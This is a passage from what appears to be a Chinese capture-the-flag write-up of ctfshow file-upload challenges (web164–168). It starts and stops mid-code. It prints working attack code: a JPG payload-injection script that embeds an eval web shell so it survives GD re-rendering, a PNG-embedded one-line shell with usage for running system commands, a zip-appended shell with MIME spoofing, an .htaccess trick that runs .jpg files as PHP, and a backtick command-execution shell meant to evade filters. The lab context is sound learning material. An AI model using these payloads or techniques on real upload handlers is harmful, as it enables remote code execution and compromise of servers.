punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//要修改的图片的路径</span> <span class="token comment">/* 木马内容&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  要修改的图片的路径,1.png是使用的文件，可以不存在</span><span class="token comment">//会在目录下自动创建一个1.png图片</span><span class="token comment">//图片脚本内容：$_GET[0]($_POST[1]);</span><span class="token comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           创建1.png图片成功！      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpg二次渲染"><a href="#web165-jpg二次渲染" class="headerlink" title="web165(jpg二次渲染)"></a>web165(jpg二次渲染)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token comment">//注意$转义</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>找了好久才找到可以通过的马</p><p><strong>渲染前</strong></p><p><img src="3_first.jpg" loading="lazy"><em>渲染前</em></p><p><strong>渲染后</strong></p><p><img src="3_second.jpg" loading="lazy"><em>渲染后</em></p><p><img src="web165.png" alt="image-20240702212536949" loading="lazy"></p><h4 id="web166-zip追加马"><a href="#web166-zip追加马" class="headerlink" title="web166(zip追加马)"></a>web166(zip追加马)</h4><p>只允许上传zip文件，随便上传一个，然后内容改为一句话木马即可，我在上传时，还有MIME检测所以也需要改</p><p><code>Content-Type=appliaction/x-zip-compressed</code></p><p><img src="web166.png" loading="lazy"></p><p>最后点击下载文件，抓包后发起POST请求得到flag</p><p><img src="web166_2.png" loading="lazy"></p><h4 id="web167-htaccess"><a href="#web167-htaccess" class="headerlink" title="web167(.htaccess)"></a>web167(.htaccess)</h4><p>那应该和apache有关，主要利用.htaccess进行绕过了</p><p><strong>.htaccess文件</strong></p><blockquote><p>htaccess 在站点的根目录下面，不是在apache目录下，但是它属于apache的一个配置文件</p></blockquote><blockquote><p>htaccess文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301</p><p>重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p></blockquote><blockquote><p>其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文</p><p>件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p></blockquote><p>首先上传.htaccess</p><p><code>AddType application/x-httpd-php .jpg</code> &#x2F;&#x2F;将.jpg后缀的文件解析成php</p><p>然后再上传1.jpg，里面加上马的内容，之后直接访问xxx&#x2F;upload&#x2F;1.jpg即可</p><h4 id="web168-后门免杀"><a href="#web168-后门免杀" class="headerlink" title="web168(后门免杀)"></a>web168(后门免杀)</h4><p><strong>基础免杀</strong></p><p>测试，会检测<code>_GET</code>、<code>_POST</code>。</p><p>可抓包后修改直接上传php文件。</p><p><strong>反引号</strong></p><p>反引号达到命令执行的效果。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">;</span><span class="token comment">// &lt;?= `whoami`</span><span class="token delimiter important">?></span></span></code></pre><p>把源码拔下来</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-24 19:34:52# @Last Modified by:   h1xa# @Last Modified time: 2020-10-30 00:11:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filesize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filesize</span><span class="token operator">></span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"code"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"msg"</span><span class="token operator">=></span><span class="token string double-quoted-string">"文件超过1024KB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token 